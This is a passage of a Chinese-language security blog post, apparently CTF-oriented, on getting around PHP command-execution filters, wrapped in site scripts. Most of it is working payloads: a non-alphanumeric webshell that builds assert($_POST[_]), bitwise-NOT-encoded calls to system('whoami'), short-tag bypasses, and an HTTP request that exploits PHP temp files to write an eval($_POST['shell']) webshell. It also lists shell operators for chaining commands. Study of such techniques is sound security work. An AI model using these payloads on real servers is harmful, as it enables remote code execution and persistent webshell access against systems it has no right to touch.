+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;   <span style="color:#75715e">//得到&#34;S&#34;，此时$__=&#34;S&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$___ <span style="color:#f92672">.=</span> $__;   <span style="color:#75715e">//$___=&#34;AS&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$___ <span style="color:#f92672">.=</span> $__;   <span style="color:#75715e">//$___=&#34;ASS&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$__ <span style="color:#f92672">=</span> $_;   <span style="color:#75715e">//$__=&#34;A&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;   <span style="color:#75715e">//得到&#34;E&#34;，此时$__=&#34;E&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$___ <span style="color:#f92672">.=</span> $__;   <span style="color:#75715e">//$___=&#34;ASSE&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__;$__<span style="color:#f92672">++</span>;   <span style="color:#75715e">//得到&#34;R&#34;，此时$__=&#34;R&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$___ <span style="color:#f92672">.=</span> $__;   <span style="color:#75715e">//$___=&#34;ASSER&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;   <span style="color:#75715e">//得到&#34;T&#34;，此时$__=&#34;T&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$___ <span style="color:#f92672">.=</span> $__;   <span style="color:#75715e">//$___=&#34;ASSERT&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$__ <span style="color:#f92672">=</span> $_;   <span style="color:#75715e">//$__=&#34;A&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$____ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;_&#34;</span>;   <span style="color:#75715e">//$____=&#34;_&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;   <span style="color:#75715e">//得到&#34;P&#34;，此时$__=&#34;P&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$____ <span style="color:#f92672">.=</span> $__;   <span style="color:#75715e">//$____=&#34;_P&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$__ <span style="color:#f92672">=</span> $_;   <span style="color:#75715e">//$__=&#34;A&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;   <span style="color:#75715e">//得到&#34;O&#34;，此时$__=&#34;O&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$____ <span style="color:#f92672">.=</span> $__;   <span style="color:#75715e">//$____=&#34;_PO&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;   <span style="color:#75715e">//得到&#34;S&#34;，此时$__=&#34;S&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$____ <span style="color:#f92672">.=</span> $__;   <span style="color:#75715e">//$____=&#34;_POS&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$__<span style="color:#f92672">++</span>;   <span style="color:#75715e">//得到&#34;T&#34;，此时$__=&#34;T&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$____ <span style="color:#f92672">.=</span> $__;   <span style="color:#75715e">//$____=&#34;_POST&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$_ <span style="color:#f92672">=</span> $$____;   <span style="color:#75715e">//$_=$_POST
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$___($_[<span style="color:#a6e22e">_</span>]);   <span style="color:#75715e">//ASSERT($POST[_])
+</span></span></span></code></pre></div><p>php对大小写不敏感</p>
+<p>用url编码</p>
+<h5 id="4过滤了_">4.过滤了_<a hidden class="anchor" aria-hidden="true" href="#4过滤了_">#</a></h5>
+<p><strong>PHP中的短标签</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010"> == &lt;?php&gt;  //需要开启short_open_tag
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;?=?&gt; == &lt;? echo&gt;  //默认开启
+</span></span></span></code></pre></div><p><img loading="lazy" src="E:%5cblog%5cmyblog%5ccontent%5cposts%5cweb%5c%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%5c2.png" alt=""  />
+</p>
+<p>payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&gt;?&lt;?=</span><span style="color:#e6db74">`{${~&#34;%a0%b8%ba%ab&#34;}[%a0]}`</span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><h5 id="5过滤了">5.过滤了;<a hidden class="anchor" aria-hidden="true" href="#5过滤了">#</a></h5>
+<p>用短标签绕过</p>
+<h5 id="6过滤了">6.过滤了$<a hidden class="anchor" aria-hidden="true" href="#6过滤了">#</a></h5>
+<p><strong>PHP7:</strong></p>
+<p>在PHP7中，我们可以使用($a)()这种方法来执行命令。这里我使用call_user_func()来举例(不使用assert()的原因上面已经解释过)。
+我构造了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">shell</span><span style="color:#f92672">=</span>(<span style="color:#f92672">~%</span><span style="color:#ae81ff">9</span><span style="color:#a6e22e">c</span><span style="color:#f92672">%</span><span style="color:#ae81ff">9</span><span style="color:#a6e22e">e</span><span style="color:#f92672">%</span><span style="color:#ae81ff">93</span><span style="color:#f92672">%</span><span style="color:#ae81ff">93</span><span style="color:#f92672">%</span><span style="color:#a6e22e">a0</span><span style="color:#f92672">%</span><span style="color:#ae81ff">8</span><span style="color:#a6e22e">a</span><span style="color:#f92672">%</span><span style="color:#ae81ff">8</span><span style="color:#a6e22e">c</span><span style="color:#f92672">%</span><span style="color:#ae81ff">9</span><span style="color:#a6e22e">a</span><span style="color:#f92672">%</span><span style="color:#ae81ff">8</span><span style="color:#a6e22e">d</span><span style="color:#f92672">%</span><span style="color:#a6e22e">a0</span><span style="color:#f92672">%</span><span style="color:#ae81ff">99</span><span style="color:#f92672">%</span><span style="color:#ae81ff">8</span><span style="color:#a6e22e">a</span><span style="color:#f92672">%</span><span style="color:#ae81ff">91</span><span style="color:#f92672">%</span><span style="color:#ae81ff">9</span><span style="color:#a6e22e">c</span>)(<span style="color:#f92672">~%</span><span style="color:#ae81ff">8</span><span style="color:#a6e22e">c</span><span style="color:#f92672">%</span><span style="color:#ae81ff">86</span><span style="color:#f92672">%</span><span style="color:#ae81ff">8</span><span style="color:#a6e22e">c</span><span style="color:#f92672">%</span><span style="color:#ae81ff">8</span><span style="color:#a6e22e">b</span><span style="color:#f92672">%</span><span style="color:#ae81ff">9</span><span style="color:#a6e22e">a</span><span style="color:#f92672">%</span><span style="color:#ae81ff">92</span>,<span style="color:#f92672">~%</span><span style="color:#ae81ff">88</span><span style="color:#f92672">%</span><span style="color:#ae81ff">97</span><span style="color:#f92672">%</span><span style="color:#ae81ff">90</span><span style="color:#f92672">%</span><span style="color:#ae81ff">9</span><span style="color:#a6e22e">e</span><span style="color:#f92672">%</span><span style="color:#ae81ff">92</span><span style="color:#f92672">%</span><span style="color:#ae81ff">96</span>,<span style="color:#e6db74">&#39;&#39;</span>);
+</span></span></code></pre></div><p>其中</p>
+<p>~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c是&quot;call_user_func&quot;，</p>
+<p>~%8c%86%8c%8b%9a%92是&quot;system&quot;，</p>
+<p>~%88%97%90%9e%92%96是&quot;whoami&quot;。
+成功执行命令</p>
+<p><strong>PHP5:</strong></p>
+<p>php5不支持上面的方法来执行命令，</p>
+<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=2#reply-list">无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)</a></p>
+<p><strong>1.</strong> Linux下可以用 <strong>.</strong> 来执行文件
+<strong>2.</strong> PHP中POST上传文件会把我们上传的文件暂时存在/tmp文件夹中，默认文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母</p>
+<p>用这个来锁定临时文件 需要多传几次</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">.</span> <span style="color:#f92672">/???/????????</span>[<span style="color:#f92672">@-</span>[]
+</span></span></code></pre></div><p>可以根据实际</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>POST /?code=?&gt;&lt;?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]`%3b?&gt; HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: xxxxxx:2333
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
+</span></span><span style="display:flex;"><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+</span></span><span style="display:flex;"><span>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+</span></span><span style="display:flex;"><span>Content-Type:multipart/form-data;boundary=--------123
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests: 1
+</span></span><span style="display:flex;"><span>Content-Length: 106
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>----------123
+</span></span><span style="display:flex;"><span>Content-Disposition:form-data;name=&#34;file&#34;;filename=&#34;1.txt&#34;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo &#34;&lt;?php eval(\$_POST[&#39;shell&#39;]);&#34; &gt; success.php
+</span></span><span style="display:flex;"><span>----------123--
+</span></span></code></pre></div><p><img loading="lazy" src="E:%5cblog%5cmyblog%5ccontent%5cposts%5cweb%5c%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%5c3.png" alt=""  />
+</p>
+<p>这里可以直接一句话 上蚁剑</p>
+<h5 id="管道符的使用">管道符的使用<a hidden class="anchor" aria-hidden="true" href="#管道符的使用">#</a></h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/;|cat|flag/i&#34;</span>, $c)){
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>($c<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span>);
+</span></span><span style="display:flex;"><span>    }<span style="color:#75715e">//将结果重定向到空文件 错误也是 即丢弃
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>1,&#34; ; &#34;: 执行完前面的语句在执行后面的语句。
+</span></span><span style="display:flex;"><span>2.“ | “: 显示后面的语句的执行结果。（文件名+|base64）
+</span></span><span style="display:flex;"><span>3.” || “：当前的语句执行出错时，执行后面的语句。前面的语句只能为假后面的语句才能执行。
+</span></span><span style="display:flex;"><span>4.” &amp; “：两条命令都执行，如果前面语句为假则执行后面的语句，前面的语句可真可假。
+</span></span><span style="display:flex;"><span>5.” &amp;&amp; “：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则执行两条命令，前面的语句只能为真。
+</span></span></code></pre></div>
+
+        </div>
+        <div class="post-reward">
+            <div style="padding: 0 0 0 0; margin: 0 0 0 0; width: 100%; font-size:16px; text-align: center;">
+                <div id="QR" style="opacity: 0;">
+                    <div id="wechat" style="display: inline-block">
+                        <a class="fancybox" rel="group">
+                            <img id="wechat_qr" src="https://DiFly0828.github.io/img/" alt="wechat_pay"></a>
+                        <p>微信</p>
+                    </div>
+                    <div id="alipay" style="display: inline-block">
+                        <a class="fancybox" rel="group">
+                            <img id="alipay_qr" src="https://DiFly0828.github.io/img/" alt="alipay"></a>
+                        <p>支付宝</p>
+                    </div>
+                </div>
+                <button id="rewardButton"
+                        onclick="
+                    var qr = document.getElementById('QR');
+                    if (qr.style.opacity === '0') {
+                        qr.style.opacity='1';
+                    } else {
+                        qr.style.opacity='0'
+                    }"
+                >
+                    <span>🧧 鼓励</span>
+                </button>
+            </div>
+        </div>
+
+        <footer class="post-footer">
+            
+<nav class="paginav">
+  <a class="next" href="https://DiFly0828.github.io/en/posts/web/helloworld/">
+    <span class="title">下一页 »</span>
+    <br>
+    <span>Helloworld</span>
+  </a>
+</nav>
+
+        </footer>
+    </div>
+
+<style>
+    .comments_details summary::marker {
+        font-size: 20px;
+        content: '👉展开评论';
+        color: var(--content);
+    }
+    .comments_details[open] summary::marker{
+        font-size: 20px;
+        content: '👇关闭评论';
+        color: var(--content);
+    }
+</style>
+
+
+<div>
+    <details class="comments_details">
+        <summary style="cursor: pointer; margin: 50px 0 20px 0;width: 130px;">
+            <span style="font-size: 20px;color: var(--content);">...</span>
+        </summary>
+        <div id="tcomment"></div>
+    </details>
+    <script src="https://cdn.staticfile.org/twikoo/1.5.8/twikoo.all.min.js">
+    </script>
+    <script>
+        twikoo.init({
+            envId:  null ,
+        el: "#tcomment",
+            lang: 'zh-CN',
+            region:  null ,
+        path: window.TWIKOO_MAGIC_PATH||window.location.pathname,
+        })
+    </script>
+</div>
+</article>
+</main>
+
+<footer class="footer">
+    <span>
+        Copyright
+        &copy;
+        2020-2023
+        <a href="https://DiFly0828.github.io/en/" style="color:#939393;">DiFly&#39;s Blog</a>
+        All Rights Reserved
+    </span>
+    <a href="https://beian.miit.gov.cn/" target="_blank" style="color:#939393;"></a>&nbsp;
+    <span>
+        <a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=null"
+           style="display:inline-block;text-decoration:none;height:20px;color:#939393;">
+            <img src="" style="float:left;margin: 0px 5px 0px 0px;"/>
+            
+        </a>
+    </span>
+    <span id="busuanzi_container">
+        <span class="fa fa-user"></span> <span id="busuanzi_value_site_uv"></span>
+        <span class="fa fa-eye"></span> <span id="busuanzi_value_site_pv"></span>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <span class="topInner">
+        <svg class="topSvg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+            <path d="M12 6H0l6-6z"/>
+        </svg>
+        <span id="read_progress"></span>
+    </span>
+</a>
+
+<script>
+    document.addEventListener('scroll', function (e) {
+        const readProgress = document.getElementById("read_progress");
+        const scrollHeight = document.documentElement.scrollHeight;
+        const clientHeight = document.documentElement.clientHeight;
+        const scrollTop = document.documentElement.scrollTop || document.body.scrollTop;
+        readProgress.innerText = ((scrollTop / (scrollHeight - clientHeight)).toFixed(2) * 100).toFixed(0);
+    })
+</script>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    let mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 200 || document.documentElement.scrollTop > 200) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        (function() {
+            document.cookie = "change-themes" + "="+ escape ("false");
+        })()
+
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    });
+</script>
+
+<script>
+    document.body.addEventListener('copy', function (e) {
+        if (window.getSelection().toString() && window.getSelection().toString().length > 50) {
+            let clipboardData = e.clipboardData || window.clipboardData;
+            if (clipboardData) {
+                e.preventDefault();
+                let htmlData = window.getSelection().toString() +
+                    '\r\n\n————————————————\r\n' +
+                    '版权声明：本文为「'+"DiFly's Blog"+'」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。' +
+                '\r\n原文链接：' + location.href;
+                let textData = window.getSelection().toString() +
+                    '\r\n\n————————————————\r\n' +
+                    '版权声明：本文为「'+"DiFly's Blog"+'」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。' +
+                '\r\n原文链接：' + location.href;
+                clipboardData.setData('text/html', htmlData);
+                clipboardData.setData('text/plain', textData);
+            }
+        }
+    });
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerText = '📄复制';
+
+        function copyingDone() {
+            copybutton.innerText = '👌🏻已复制!';
+            setTimeout(() => {
+                copybutton.innerText = '📄复制';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                let text = codeblock.textContent +
+                    '\r\n————————————————\r\n' +
+                    '版权声明：本文为「'+"DiFly's Blog"+'」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。' +
+                '\r\n原文链接：' + location.href;
+                navigator.clipboard.writeText(text);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) {}
+            selection.removeRange(range);
+        });
+
+        let language = codeblock.className.replaceAll("language-", "")
+        let macTool = document.createElement("div")
+        let macTool1 = document.createElement("div")
+        let macTool2 = document.createElement("div")
+        let macTool3 = document.createElement("div")
+        let languageType = document.createElement("div")
+        languageType.innerText = language
+        macTool.setAttribute('class', 'mac-tool')
+        macTool1.setAttribute('class', 'mac bb1')
+        macTool2.setAttribute('class', 'mac bb2')
+        macTool3.setAttribute('class', 'mac bb3')
+        languageType.setAttribute('class', 'language-type')
+        macTool.appendChild(macTool1)
+        macTool.appendChild(macTool2)
+        macTool.appendChild(macTool3)
+        macTool.appendChild(languageType)
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+            container.appendChild(macTool)
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+            container.appendChild(macTool)
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+            container.appendChild(macTool)
+        }
+    });
+</script>
+</body>
+
+</html>
